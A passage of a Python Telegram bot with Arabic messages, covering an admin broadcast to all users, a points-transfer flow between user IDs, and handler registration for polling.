                    f"🔗 Link: {ch_link}",
                    parse_mode='HTML'
                )
                return
            else:
                await update.message.reply_text("❌ الصيغة غلط! استخدم: `ID | الاسم | اللينك`", parse_mode='HTML')
                return
        else:
            await update.message.reply_text("❌ الصيغة غلط! استخدم: `ID | الاسم | اللينك`", parse_mode='HTML')
            return

    if context.user_data.get('admin_broadcast') and user_id == DEVELOPER_ID:
        context.user_data['admin_broadcast'] = False
        message = update.message.text
        success = 0
        failed = 0
        
        await update.message.reply_text("⏳ جاري إرسال الرسالة للمستخدمين...")
        
        for uid in points_data["points"].keys():
            try:
                await context.bot.send_message(chat_id=int(uid), text=message, parse_mode='HTML')
                success += 1
            except:
                failed += 1
        
        await update.message.reply_text(f"✅ <b>تم إرسال الرسالة بنجاح!</b>\n\n📤 <b>تم الإرسال لـ:</b> {success} مستخدم\n❌ <b>فشل الإرسال لـ:</b> {failed} مستخدم", parse_mode='HTML')
        return

    if context.user_data.get('transfer_state') == 'waiting_for_id':
        target_id = update.message.text.strip()
        if not target_id.isdigit():
            await update.message.reply_text("❌ يرجى إدخال آيدي صحيح (أرقام فقط)!")
            return
        context.user_data['transfer_target'] = target_id
        context.user_data['transfer_state'] = 'waiting_for_amount'
        await update.message.reply_text(
            f"✅ تم حفظ الآيدي: <code>{target_id}</code>\n\nالآن أرسل عدد النقاط التي تريد تحويلها:",
            parse_mode='HTML'
        )
        return

    if context.user_data.get('transfer_state') == 'waiting_for_amount':
        try:
            amount = int(update.message.text.strip())
            if amount <= 0: raise ValueError
        except:
            await update.message.reply_text("❌ يرجى إدخال عدد صحيح موجب من النقاط!")
            return
        
        target_id = context.user_data.get('transfer_target')
        sender_points = get_user_points(user_id)
        
        if sender_points < amount:
            await update.message.reply_text(
                f"❌ <b>رصيدك غير كافي!</b>\n\n💥 <b>نقاطك:</b> {sender_points}\n🔒 <b>تحتاج:</b> {amount} نقطة للتحويل.",
                parse_mode='HTML'
            )
            return
        
        add_user_points(user_id, -amount)
        add_user_points(target_id, amount)
        
        await update.message.reply_text(
            f"✅ <b>تم تحويل {amount} نقطة بنجاح!</b>\n\n"
            f"👤 <b>إلى الآيدي:</b> <code>{target_id}</code>\n"
            f"💥 <b>رصيدك المتبقي:</b> {get_user_points(user_id)} نقطة",
            parse_mode='HTML'
        )
        
        try:
            await context.bot.send_message(
                chat_id=int(target_id),
                text=f"🎉 <b>تم إضافة {amount} نقطة إلى حسابك! ✅</b>\n\n"
                     f"👤 <b>من:</b> {update.effective_user.full_name}\n"
                     f"💥 <b>رصيدك الحالي:</b> {get_user_points(target_id)} نقطة",
                parse_mode='HTML'
            )
        except:
            await update.message.reply_text("⚠️ تم التحويل، لكن تعذر إرسال إشعار للمستلم (ربما لم يبدأ البوت بعد).")
        
        context.user_data['transfer_state'] = None
        context.user_data['transfer_target'] = None
        return

    if update.message.text == "/start":
        await start(update, context)
    elif update.message.text == "/admin" and user_id == DEVELOPER_ID:
        await admin_panel(update, context)

def main():
    load_data()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("addpoints", add_points))
    app.add_handler(CommandHandler("resetpoints", reset_points))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("⚔ البوت شغال... (v10.0 Pro - مع قسم الأرقام الوهمية وكل الأقسام)")
    app.run_polling()

if __name__ == "__main__":
    main()
